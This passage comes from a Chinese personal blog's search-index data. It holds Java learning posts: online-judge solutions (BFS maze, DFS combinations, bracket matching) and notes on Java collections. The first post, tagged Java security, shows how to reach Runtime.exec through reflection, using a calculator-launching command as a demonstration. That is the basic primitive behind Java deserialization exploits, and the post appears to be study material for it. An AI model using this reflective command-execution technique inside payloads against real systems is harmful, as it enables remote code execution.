单例模式保证了全局对象的唯一性，比如系统启动读取配置文件就需要单例保证配置的一致性。 java.lang.Runtime就是一个单例模式 1234567891011121314151617public class Runtime &#123; private static Runtime currentRuntime = new Runtime(); /** * Returns the runtime object associated with the current Java application. * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance * methods and must be invoked with respect to the current runtime object. * * @return the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current * Java application. */ public static Runtime getRuntime() &#123; return currentRuntime; &#125; /** Don&#x27;t let anyone else instantiate this class */ private Runtime() &#123;&#125; Runtime的Runtime.exec调用注意点，invoke作用是执行方法，第一个参数为： 如果是普通方法执行invoke，第一个参数放对象的实例； 如果是静态方法执行invoke，可以放null或类名； 放调用代码 123456789101112131415161718import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 21:22 */public class Test_Reflect_Get_methods &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123; Class c = Class.forName(&quot;java.lang.Runtime&quot;); Method method = c.getDeclaredMethod(&quot;exec&quot;, String.class); Method method1 = c.getDeclaredMethod(&quot;getRuntime&quot;); Object obj = method1.invoke(null);//因为getRuntime为静态方法，并且return也是Runtime method.invoke(obj, &quot;open /System/Applications/Calculator.app&quot;); &#125;&#125;","categories":[{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"},{"name":"JAVA安全","slug":"JAVA基础/JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"NYOJ58-广度优先搜索算法","slug":"NYOJ58-广度优先搜索算法","date":"2023-02-17T12:28:31.000Z","updated":"2023-02-17T12:31:28.493Z","comments":true,"path":"2023/02/17/NYOJ58-广度优先搜索算法/","link":"","permalink":"https://f19t.github.io.git/2023/02/17/NYOJ58-%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/","excerpt":"NYOJ-58-广度优先搜索算法最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。","text":"NYOJ-58-广度优先搜索算法最近三天学习了深度优先算法，并做了一道oj题，遇到了一些问题，并解决了一些问题，这里记录一下。 题目描述：描述这有一个迷宫，有0~8行和0~8列： 1,1,1,1,1,1,1,1,1 1,0,0,1,0,0,1,0,1 1,0,0,1,1,0,0,0,1 1,0,1,0,1,1,0,1,1 1,0,0,0,0,1,0,0,1 1,1,0,1,0,1,0,0,1 1,1,0,1,0,1,0,0,1 1,1,0,1,0,0,0,0,1 1,1,1,1,1,1,1,1,1 0表示道路，1表示墙。现在输入一个道路的坐标作为起点，再如输入一个道路的坐标作为终点，问最少走几步才能从起点到达终点？（注：一步是指从一坐标点走到其上下左右相邻坐标点，如：从（3，1）到（4,1）。） 输入描述第一行输入一个整数n（0&lt;n&lt;&#x3D;100），表示有n组测试数据;随后n行,每行有四个整数a,b,c,d（0&lt;&#x3D;a,b,c,d&lt;&#x3D;8）分别表示起点的行、列，终点的行、列。 输出描述 输出最少走几步。 解题源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import java.util.*;public class OJ58 &#123; static int[][] walked =new int[9][9]; //记录那些路径走过 static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//创建队列，将所有的位置都走一遍 static int[][] map=&#123;&#123;1,1,1,1,1,1,1,1,1&#125;, &#123;1,0,0,1,0,0,1,0,1&#125;, &#123;1,0,0,1,1,0,0,0,1&#125;, &#123;1,0,1,0,1,1,0,1,1&#125;, &#123;1,0,0,0,0,1,0,0,1&#125;, &#123;1,1,0,1,0,1,0,0,1&#125;, &#123;1,1,0,1,0,1,0,0,1&#125;, &#123;1,1,0,1,0,0,0,0,1&#125;, &#123;1,1,1,1,1,1,1,1,1&#125;&#125;; public static void main(String[] args) &#123; Scanner in =new Scanner(System.in); int n = in.nextInt(); for (int i = 0; i &lt; n; i++) &#123; int a = in.nextInt(); int b = in.nextInt(); int c = in.nextInt(); int d = in.nextInt(); if (a == c &amp;&amp; b == d) &#123; System.out.println(0); continue; &#125; move(a, b,0); while (queue.size() != 0) &#123; location laca = queue.poll();// System.out.print(&quot;走过(&quot;);// System.out.print(laca.x);// System.out.print(&quot;,&quot;);// System.out.print(laca.y);// System.out.print(&quot;)位置&quot;);// System.out.print(&quot;，步数&quot;);// System.out.println(laca.step); if (laca.x == c &amp;&amp; laca.y == d) &#123; System.out.println(laca.step); queue.clear(); for (int w = 0; w &lt; 9; w++) &#123; Arrays.fill(walked[w], 0);//二维数组全部赋值为0 &#125; break; &#125; else &#123; move(laca.x,laca.y, laca.step); &#125; &#125; &#125; &#125; private static void move(int x, int y, int steps) &#123; //每个点上下左右移动 ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(-1); for (int i : list) &#123; if (x + i &gt; -1 &amp;&amp; x + i &lt;= 8 &amp;&amp; walked[x + i][y] == 0 &amp;&amp; map[x + i][y] == 0) &#123; walked[x + i][y] = 1; location laca = new location(); laca.x = x + i; laca.y = y; laca.step =steps+1; queue.offer(laca); &#125; &#125; for (int i : list) &#123; if (y + i &gt; -1 &amp;&amp; y + i &lt;= 8 &amp;&amp; walked[x][y + i] == 0 &amp;&amp; map[x][y + i] == 0) &#123; walked[x][y + i] = 1; location laca = new location(); laca.x = x; laca.y = y+i; laca.step = steps+1; queue.offer(laca); &#125; &#125; &#125;&#125;class location &#123; int x; int y; int step;&#125; 遇到的问题java结构体java没有结构体，Queue E是泛型 可以自己构建类去充当元素，使用object &#x3D;null去释放赋值对象。 123456789//Interface Queue&lt;E&gt;class location &#123; int x; int y; int step;&#125;location laca = new location();queue.offer(laca); 多维数组赋值为0java.util.Arrays.fill()方法处理的是一维数组，处理二维数组使用： 123for (int w = 0; w &lt; 9; w++) &#123; Arrays.fill(walked[w], 0);//二维数组全部赋值为0&#125; 心得广度优先搜索可以解决最短路径问题，像火一样蔓延，一层层去查找。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"NYOJ-32-深度优先搜索算法","slug":"NYOJ32-深度优先搜索算法","date":"2023-02-15T03:24:28.000Z","updated":"2023-02-15T07:39:57.412Z","comments":true,"path":"2023/02/15/NYOJ32-深度优先搜索算法/","link":"","permalink":"https://f19t.github.io.git/2023/02/15/NYOJ32-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/","excerpt":"NYOJ-32-深度优先搜索算法最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。","text":"NYOJ-32-深度优先搜索算法最近两天学习了深度优先算法，并做了一道oj题，这里记录一下。 题目描述：描述找出从自然数1、2、… 、n（0&lt;n&lt;10）中任取r(0&lt;r&lt;&#x3D;n)个数的所有组合。 输入描述输入n、r。 输出描述按特定顺序输出所有组合。特定顺序：每一个组合中的值从大到小排列，组合之间按逆字典序排列。 123456789101112输入 5 3输出：543542541532531521432431421321 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142import java.util.Scanner;public class NYOJ32 &#123; //组合数，深度优先搜索 static Scanner in =new Scanner(System.in); static int n = in.nextInt(); //读取基础数据 static int r = in.nextInt(); //读取长度 static int[] book = new int[n+1];//标记数据是否被使用 static int[] out = new int[r+1]; //设置输出长度 public static void main(String[] args) &#123; dfs(1); &#125; public static void dfs(int step) &#123; int i = 0; if (step &gt; r) &#123; for (i=1;i&lt;=r-1;i++)&#123; //判断高位大于低位 if (out[i]&lt;out[i+1])&#123; return; &#125; &#125; for (i = 1; i &lt;=r; i++) &#123; System.out.print(out[i]); &#125; System.out.println(&quot;&quot;); return; &#125; for (i = n; i &gt; 0; i--) &#123; //深度优先算法 if (book[i] == 0) &#123; out[step]=i; book[i]=1; dfs(step+1); book[i]=0; &#125; &#125; return; &#125;&#125; 学到了，理解深度优先搜索的关键在于解决 “当下该如何做” 。至于 “下一步如何做” 则与 “当下该如何做” 是一样的。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"NYOJ-2-栈的运用","slug":"NYOJ-2","date":"2023-02-13T11:16:31.000Z","updated":"2023-02-19T12:05:23.308Z","comments":true,"path":"2023/02/13/NYOJ-2/","link":"","permalink":"https://f19t.github.io.git/2023/02/13/NYOJ-2/","excerpt":"NYOJ-2-栈的运用今天刚学java集合，学到了栈，就拿这道题练练手吧。 题目描述12输入描述第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符 1每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No","text":"NYOJ-2-栈的运用今天刚学java集合，学到了栈，就拿这道题练练手吧。 题目描述12输入描述第一行输入一个数N（0&lt;N&lt;=100）,表示有N组测试数据。后面的N行输入多组输入数据，每组输入数据都是一个字符串S(S的长度小于10000，且S不是空串），测试数据组数少于5组。数据保证S中只含有&quot;[&quot;, “]”, “(”, “)” 四种字符 1每组输入数据的输出占一行，如果该字符串中所含的括号是配对的，则输出Yes,如果不配对则输出No 解题思路最近刚学了Deque，可以使用栈解决这个问题。思路：获取到”)”、”]”，就比对，不是就压栈，最后判断是否为空。后续有更好思路再补代码。 1234567891011121314151617181920212223242526272829303132333435363738import java.util.Deque;import java.util.LinkedList;import java.util.Scanner;public class OJ2 &#123; public static void main(String[] args) &#123; Scanner in = new Scanner(System.in); int num = in.nextInt(); String arr[] = new String[num]; for (int i = 0; i&lt;num;i++)&#123;arr[i]=in.next();&#125; for (int i = 0; i&lt;num;i++)&#123; String s = judge(arr[i]); System.out.println(s); &#125; &#125; public static String judge(String s)&#123; Deque&lt;String&gt; deque = new LinkedList&lt;&gt;(); for (int i =0;i&lt;s.length();i++)&#123; deque.offerLast(s.substring(i,i+1)); if (deque.peekLast().equals(&quot;)&quot;))&#123; if (deque.size()==1)&#123;return &quot;No&quot;;&#125; deque.pollLast(); if (deque.peekLast().equals(&quot;(&quot;))&#123;deque.removeLast();&#125; else &#123;return &quot;No&quot;;&#125; &#125; else if(deque.peekLast().equals(&quot;]&quot;))&#123; if (deque.size()==1)&#123;return &quot;No&quot;;&#125; deque.pollLast(); if (deque.peekLast().equals(&quot;[&quot;))&#123;deque.removeLast();&#125; else &#123;return &quot;No&quot;;&#125; &#125; &#125; if (deque.size()==0)&#123;return &quot;Yes&quot;;&#125;else &#123;return &quot;No&quot;;&#125; &#125;&#125; 学到了比较值需要使用 .equals() 。","categories":[{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Java集合","slug":"Java集合","date":"2023-02-13T07:38:34.000Z","updated":"2023-02-13T11:26:52.908Z","comments":true,"path":"2023/02/13/Java集合/","link":"","permalink":"https://f19t.github.io.git/2023/02/13/Java%E9%9B%86%E5%90%88/","excerpt":"Java集合本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。","text":"Java集合本文介绍Java集合的数据结构，与简单测试。为后续学习算法打基础。 List123456789101112131415import java.util.ArrayList;import java.util.List;public class Test &#123; public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;String&gt;(); list.add(&quot;apple&quot;); // size=1 list.add(&quot;pear&quot;); // size=2 list.add(&quot;apple&quot;); // 允许重复添加元素，size=3 System.out.println(list.size()); list.remove(1);//删除pear System.out.println(list.size()); System.out.println(list.get(1)); &#125;&#125; 12332apple List是一种顺序列表接口常用方法： 在末尾添加一个元素：boolean add(E e) 在指定索引添加一个元素：boolean add(int index, E e) 删除指定索引的元素：E remove(int index) 删除某个元素：boolean remove(Object e) 获取指定索引的元素：E get(int index) 获取链表大小（包含元素的个数）：int size() Map1234567891011121314151617import java.util.HashMap;import java.util.Map;public class Test &#123; public static void main(String[] args) &#123; Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put(&quot;s&quot;,&quot;bbbbb&quot;); map.put(&quot;a&quot;,&quot;aaaaa&quot;); System.out.println(map.get(&quot;s&quot;));//获取数据 for (String key : map.keySet())&#123; //遍历map System.out.println(map.get(key)); &#125; &#125;&#125; 123bbbbbaaaaabbbbb PropertiesJava默认配置文件以.properties为扩展名，每行以key&#x3D;value表示。java内置Properties读取配置文件非常简单。 典型配置文件： 123# setting.propertieslast_open_file=1.txtauto_save_interval=60 12345678910111213141516171819import java.io.FileNotFoundException;import java.util.Properties;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; String f = &quot;配置文件&quot;; Properties props = new Properties(); props.load(new java.io.FileInputStream(f)); String filepath = props.getProperty(&quot;last_open_file&quot;); String interval = props.getProperty(&quot;auto_save_interval&quot;, &quot;120&quot;);//如果没有值，赋予默认值 System.out.println(filepath); System.out.println(interval); &#125;&#125; 121.txt60 Set只需要存储不重复的key，并不需要存储映射的value，那么就可以使用Set。 Queue队列（Queue）是一种经常使用的集合。Queue实际上是实现了一个先进先出（FIFO：First In First Out）的有序表。它和List的区别在于，List可以在任意位置添加和删除元素，而Queue只有两个操作： 把元素添加到队列末尾； 从队列头部取出元素。 队列接口Queue定义了以下几个方法： int size()：获取队列长度； boolean add(E)&#x2F;boolean offer(E)：添加元素到队尾； E remove()&#x2F;E poll()：获取队首元素并从队列中删除； E element()&#x2F;E peek()：获取队首元素但并不从队列中删除。 123456789101112131415161718192021222324import java.io.FileNotFoundException;import java.util.*;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; Queue&lt;String&gt; q = new LinkedList&lt;&gt;(); q.offer(&quot;aaaaaaa&quot;); q.offer(&quot;bbbbbbb&quot;); q.offer(&quot;ccccccc&quot;); System.out.println(q.peek());//获取首位数据，不删除 System.out.println(q.peek()); System.out.println(q.peek()); System.out.println(&quot;-------------&quot;); System.out.println(q.poll());//获取首位数据，并删除 System.out.println(q.poll()); System.out.println(q.poll()); &#125;&#125; 1234567aaaaaaaaaaaaaaaaaaaaa-------------aaaaaaabbbbbbbccccccc Deque两头都出，这种队列叫双端队列（Double Ended Queue），学名Deque。Java集合提供了接口Deque来实现一个双端队列，它的功能是： 既可以添加到队尾，也可以添加到队首； 既可以从队首获取，又可以从队尾获取。 用处：Deque当Stack使用。 123456789101112131415161718192021222324import java.io.FileNotFoundException;import java.util.*;public class Test &#123; public static void main(String[] args) throws FileNotFoundException,Exception&#123; Deque&lt;String&gt; q = new LinkedList&lt;&gt;(); q.offerLast(&quot;aaaaaaa&quot;); q.offerLast(&quot;bbbbbbb&quot;); q.offerLast(&quot;ccccccc&quot;); System.out.println(q.peekLast());//获取末位数据，不删除 System.out.println(q.peekLast()); System.out.println(q.peekLast()); System.out.println(&quot;-------------&quot;); System.out.println(q.pollLast());//获取末位数据，并删除 System.out.println(q.pollLast()); System.out.println(q.pollLast()); &#125;&#125; 1234567ccccccccccccccccccccc-------------cccccccbbbbbbbaaaaaaa","categories":[{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]}],"categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"JAVA安全/漏洞分析","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"JAVA基础","slug":"JAVA基础","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/"},{"name":"JAVA安全","slug":"JAVA基础/JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%9F%BA%E7%A1%80/JAVA%E5%AE%89%E5%85%A8/"},{"name":"OJ","slug":"OJ","permalink":"https://f19t.github.io.git/categories/OJ/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"log4j2","slug":"log4j2","permalink":"https://f19t.github.io.git/tags/log4j2/"},{"name":"shiro","slug":"shiro","permalink":"https://f19t.github.io.git/tags/shiro/"},{"name":"算法","slug":"算法","permalink":"https://f19t.github.io.git/tags/%E7%AE%97%E6%B3%95/"}]}